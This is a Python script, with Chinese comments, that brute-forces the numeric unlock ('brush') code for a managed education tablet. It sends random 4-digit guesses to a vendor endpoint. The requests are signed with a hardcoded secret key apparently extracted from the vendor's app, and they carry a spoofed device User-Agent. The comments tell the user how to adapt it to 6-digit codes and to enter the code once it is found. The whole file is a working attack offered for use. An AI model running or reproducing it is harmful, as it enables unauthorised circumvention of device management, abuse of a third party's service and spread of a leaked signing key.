import requests
import json
import hashlib
import random
import time


# 注意事项：
# 请更改device_id为您的设备号（大写，11位）
# 据有效情报，动态码为4位
# 但也不排除6位的可能性，因为ZTY代码里离线验证模式下确实写的是6位
# 这时，请将代码里所有的try_code:04改为try_code:06
# 在输出 CODE **** RETURNED 200后，请在一分钟内输入动态码
# 祝你好运！

def get_zty_sign_url(base_url,method,payload):
    timestamp = str(int(time.time() * 1000))
    SIGNATURE_KEY = "eptim]q34imt5b]-q04i5q=fdkfjfsadlkjfasdfrt573df4pltoy]-pn965498d"
    sign_raw_string = f"{method}{base_url}{timestamp}{SIGNATURE_KEY}{payload}"
    sign = hashlib.md5(sign_raw_string.encode('utf-8')).hexdigest()
    final_url = f"{base_url}?sign={sign}&t={timestamp}"
    return final_url

def patch_brush_code(code, device_id):

    base_url = "https://ztp.yunzuoye.net/api/v2/pub/platform/brushCode"

    user_agent = f"com.xuehai.launcher/v1.21.06.20251212hwS (SM-P200; android; 9; {device_id})"
    
    headers = {
        "Content-Type": "application/json",
        "Accept": "*/*",
        "User-Agent": user_agent
    }

    payload_dict = {
        "code": code,
        "deviceId": device_id
    }
    payload_data = json.dumps(payload_dict, separators=(',', ':'))
 
    method="PATCH"
    final_url=get_zty_sign_url(base_url,method,payload_data)
    
    response = requests.patch(final_url, headers=headers, data=payload_data)

    return response


if __name__=="__main__":
    
    device_id = "Your uppercase device id here."
    
    try_count = 0

    print("Using device",device_id,"to crack code.")

    start_time = time.strftime("%H:%M:%S", time.localtime())
    while True:
        try_code = random.randint(0,9999)
        try_code_str = f"{try_code:04}"
        result = patch_brush_code(try_code, device_id)
        result_json = result.json()
        try_count += 1
        result_code = result.status_code
        
        if "msg" in result_json:
            result_msg = result_json["msg"]
        elif "message" in result_json:
            result_msg = result_json["message"]
        else:
            result_msg = "NULL"
            
        if result_code == 400 and result_msg == "刷机码输入错误":
            print("["+time.strftime("%H:%M:%S", time.localtime())+"] ","CODE",try_code_str,"RETURNED 400")
        elif result_code == 429:
            print("["+time.strftime("%H:%M:%S", time.localtime())+"] ","RETURNED 429")
            break
        else:
            print("["+time.strftime("%H:%M:%S", time.localtime())+"] ","CODE",try_code_str,"RETURNED",result_code,"AND MSG",result_msg)
            with open('log.txt', 'a', encoding='utf-8') as file:
                file.write("["+time.strftime("%H:%M:%S", time.localtime())+"]  "+"CODE "+try_code_str+" RETURNED "+str(result_code)+" AND MSG "+result_msg+"\n")
            time.sleep(60)
            break


    end_time = time.strftime("%H:%M:%S", time.localtime())
    print("START TIME: "+start_time)
    print("END TIME: "+end_time)
    print("TRY COUNT: "+str(try_count))
    with open('log.txt', 'a', encoding='utf-8') as file:
        file.write("START TIME: "+start_time+"\n")
        file.write("END TIME: "+end_time+"\n")
        file.write("TRY COUNT: "+str(try_count)+"\n")
        
            

